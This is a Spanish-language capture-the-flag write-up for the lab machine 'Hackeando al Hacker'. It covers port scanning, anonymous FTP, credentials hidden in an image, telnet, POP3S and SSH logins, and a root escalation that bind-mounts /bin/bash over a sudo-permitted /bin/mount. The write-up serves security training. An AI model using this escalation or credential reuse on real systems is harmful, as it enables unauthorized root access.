---
creator: nohh022
pubDatetime: 2026-05-05T15:22:00Z
title: Hackeando al Hacker
slug: hackeando-al-hacker
platform: The Hackers Labs
ogImage: ../../assets/images/thehackerslabs/hackeando-al-hacker/hackeando-al-hacker.jpg
featured: true
tags:
  - forense
  - sudo
  - mail
  - linux
description:
  Write up de la máquina Hackeando al hacker de la plataforma The Hackers Labs
---

## Información General

![info](../../assets/images/thehackerslabs/hackeando-al-hacker/hackeando-al-hacker.jpg)

## Table of contents

## Enumeración

La máquina Hackeando al hacker tiene la ip **10.0.2.31**

### Descubrimiento de Puertos

Vamos a empezar enumerando todos los puertos abiertos de la máquina, así como los servicios y las versiones que se están ejecutando en ellos mediante la herramienta **nmap**.

```bash
# Nmap 7.99 scan initiated Sat May  2 08:21:35 2026 as: /usr/lib/nmap/nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn -oN target 10.0.2.31
Nmap scan report for 10.0.2.31
Host is up (0.00036s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2024-10-16T11:07:27
|_Not valid after:  2034-10-14T11:07:27
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL SASL(PLAIN) PIPELINING CAPA RESP-CODES TOP USER AUTH-RESP-CODE
2121/tcp open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Feb 02 02:48 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.2.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
2222/tcp open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
2323/tcp open  telnet
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2323-TCP:V=7.99%I=7%D=5/2%Time=69F5EC5F%P=x86_64-pc-linux-gnu%r(tn3
SF:270,21,"\xff\xfb%\xff\xfb&\xff\xfd\x18\xff\xfd\x20\xff\xfd#\xff\xfd'\xf
SF:f\xfd\$\xff\xfe\x19\xff\xfc\x19\xff\xfd\0\xff\xfb\0");
MAC Address: 08:00:27:B6:89:2C (Oracle VirtualBox virtual NIC)
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

### Puerto 80 (Web)

Se está ejecutando un servicio web con Apache, tras realizar diferentes enumeraciones no encontramos nada.

### Puerto 2121 (FTP)

Ejecuta un servicio de **ftp** y está habilitada la sesión con el usuario **anonymous**, por lo tanto nos vamos a conectar como él.

```bash
ftp -a 10.0.2.31 -p 2121

ftp>ls 
229 Entering Extended Passive Mode (|||40465|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Feb 02 02:48 pub

ftp> ls pub
229 Entering Extended Passive Mode (|||47892|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0           85359 Feb 02 02:38 Boleto.jpg
-rw-r--r--    1 0        0             320 Jan 30 17:58 Manifiesto_0.txt
-rw-r--r--    1 0        0          294586 Jan 30 18:51 postal_caribe.jpg
-rw-r--r--    1 0        0              58 Jan 30 18:00 postal_caribe.txt
226 Directory send OK.
```

Tenemos un directorio **pub** y dentro de él hay varios archivos, nos los descargamos a nuestro equipo.

En el archivo **Manifiesto_0.txt** encontramos:
```text
Manifiesto 0 - Phantom

Como white-hat, securizaba fortalezas ajenas... pero vi las grietas en el sistema.
Las corporaciones pagan por protección, pero el mundo real se desmorona bajo deudas y control.
¿Cuánto más puedo seguir ayudando al enemigo?

Un paraíso lejano me espera... quizás ya estoy allí.

- Phantom
```

Nos sugiere la existencia de un usuario **phantom**, miramos el contenido del otro archivo de texto, **postal_caribe.txt**:
```text
Postal del Caribe - Un sueño de escape... ¿o una pista?
```

Aquí tenemos una posible pista referente al archivo **postal_caribe.jpg**, vamos a analizar dicha imagen.

```bash
cat postal_caribe.jpg | tail -n 6

Telnet 2323
user: phantom
pass: shadow321

Conecta... pero ¿es real o solo otro cebo de Phantom?
- El paraíso espera al que sepa mirar más allá de la superficie.
```

Observamos que en los últimos datos de la imagen aparecen unas credenciales del protocolo de **telnet** que está ejecutándose en el puerto **2323** y otra pista que nos pone en duda la validez de ellas.

## Explotación

### Puerto 2323 (Telnet)

Nos conectamos al protocolo de **telnet** y proporcionamos las credenciales **phantom:shadow321**

```bash
telnet 10.0.2.31 2323

Trying 10.0.2.31...
Connected to 10.0.2.31.
Escape character is '^]'.

Linux 6.1.0-26-amd64 (shadowroot) (pts/0)

shadowroot nombre: phantom
Contraseña: 
Linux shadowroot 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
Has entrado al lair de Phantom.
Si no eres yo, ya estás muerto digitalmente...
Pero bienvenido, cazador... ¿cuánto durarás?

- Phantom
Último inicio de sesión: sáb may  2 17:16:21 CEST 2026 de 10.0.2.3 en pts/0
Tiene correo.

Bienvenido de nuevo, intruso... o ¿debería decir cazador?
Phantom sabe que estás aquí. ¿Buscas el camino verdadero?
Usa esto... pero recuerda: todo es un juego.

Conectando al servidor de correo oculto... (POP3 localhost:110)
Usuario: phantom
Pass: shadow321 (la misma que usaste aquí)

El servidor de correo te espera... demuestra que vales la pena.
Comandos POP3 básicos... no te demores.

Trying ::1...
Connection failed: Conexión rehusada
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
+OK Dovecot (Debian) ready.
```

Parece ser un servicio de **POP3** que se está ejecutando de forma local en la máquina pero no conseguimos que sus comandos funcionen, por lo que nos vamos a conectar con esas mismas credenciales al servicio de **POP3S** del puerto **995**

### Puerto 995 (POP3S)

Nos conectamos al servicio de **POP3S** utilizando **openssl**, una vez dentro nos autenticamos con las credenciales **phantom:shadow321**

Ahora listamos el número de mensajes con el comando **STAT**, nos devuelve que hay dos mensajes, así que nos vamos a descargar el primero de ellos con el comando **RETR 1**

```bash
openssl s_client -connect 10.0.2.31:995 -crlf -quiet

Connecting to 10.0.2.31
Can't use SSL_get_servername
depth=0 CN=debian
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=debian
verify return:1
+OK Dovecot (Debian) ready.

USER phantom
+OK
PASS shadow321
+OK Logged in.

STAT
+OK 2 2187

RETR 1
+OK 1881 octets
From: Phantom <phantom@local>
To: phantom@local
Subject: Credenciales SSH - No las compartas, novato
Message-Id: <E1vlsdD-0001rf-33@debian>
Date: Fri, 30 Jan 2026 18:50:07 +0100

Usuario: phantom_ssh
Contraseña: ThL_sh@d0w2026!

Conecta a SSH puerto 2222 con estas... pero ¿es el camino real?
No tardes, el tiempo corre... y yo ya estoy en el Caribe.

- Phantom
```

Obtenemos las credenciales para el servicio **SSH** del usuario **phantom_ssh**


## Acceso SSH
### Phantom_ssh

Nos conectamos al puerto 22 como **phantom_ssh**

Y obtenemos la flag de user.

```bash
ssh phantom_ssh@10.0.2.31
phantom_ssh@10.0.2.31's password: 
Linux shadowroot 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
Has entrado al lair de Phantom.
Si no eres yo, ya estás muerto digitalmente...
Pero bienvenido, cazador... ¿cuánto durarás?
- Phantom

phantom_ssh@shadowroot:~$ ls -la
total 48
drwxr-xr-x 7 phantom_ssh phantom_ssh 4096 may  4 12:37 .
drwxr-xr-x 5 root        root        4096 feb  1 22:35 ..
lrwxrwxrwx 1 root        root           9 feb  3 02:03 .bash_history -> /dev/null
-rw-r--r-- 1 phantom_ssh phantom_ssh  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 phantom_ssh phantom_ssh 3571 ene 30 22:57 .bashrc
drwxr-xr-x 3 phantom_ssh phantom_ssh 4096 ene 30 23:50 .cache
drwxr-xr-x 4 phantom_ssh phantom_ssh 4096 ene 31 03:25 .config
drwx------ 3 phantom_ssh phantom_ssh 4096 may  2 17:27 .gnupg
drwxr-xr-x 3 phantom_ssh phantom_ssh 4096 may  2 17:31 .local
-rw------- 1 phantom_ssh phantom_ssh  409 ene 30 22:27 manifest1.log
-rw-r--r-- 1 phantom_ssh phantom_ssh  807 abr 23  2023 .profile
drwxr-xr-x 2 phantom_ssh phantom_ssh 4096 ene 30 22:24 .ssh
-rw------- 1 phantom_ssh phantom_ssh  123 ene 30 22:26 THL_USER.txt
```

## Escalada de Privilegios
### Root

Si revisamos los permisos **sudoers** del usuario **phantom_ssh** vemos que podemos ejecutar como **root** el binario de **/bin/mount**

```bash
phantom_ssh@shadowroot:~$ sudo -l
Matching Defaults entries for phantom_ssh on shadowroot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User phantom_ssh may run the following commands on shadowroot:
    (ALL) NOPASSWD: /usr/sbin/cryptsetup, /bin/mount, /bin/umount, /usr/bin/mkdir
```

Vamos a utilizar el binario **mount** para sustituirlo por una **bash** de forma que cuando volvamos a lanzar **mount** nos lanzará una **bash** y como este proceso lo ejecutamos como el usuario **root** nos convertiremos en él.

```bash
phantom_ssh@shadowroot:~$ sudo /bin/mount -o bind /bin/bash /bin/mount
phantom_ssh@shadowroot:~$ sudo /bin/mount

root@shadowroot:/home/phantom_ssh# whoami
root
root@shadowroot:/home/phantom_ssh# ls -la /root
total 72
drwx------  5 root root  4096 feb  3 02:03 .
drwxr-xr-x 18 root root  4096 oct 16  2024 ..
lrwxrwxrwx  1 root root     9 feb  3 02:03 .bash_history -> /dev/null
-rw-r--r--  1 root root   571 abr 10  2021 .bashrc
drwx------  3 root root  4096 feb  2 00:48 .config
-rw-------  1 root root    20 ene 31 01:12 .lesshst
drwxr-xr-x  3 root root  4096 oct 16  2024 .local
-rw-------  1 root root   245 feb  1 23:09 manifest5.txt
-rw-------  1 root root 30720 feb  1 21:22 mpg123_final.mp3
-rw-r--r--  1 root root   161 jul  9  2019 .profile
drwx------  2 root root  4096 oct 16  2024 .ssh
-rw-------  1 root root    31 feb  1 21:52 THL_ROOT.txt
```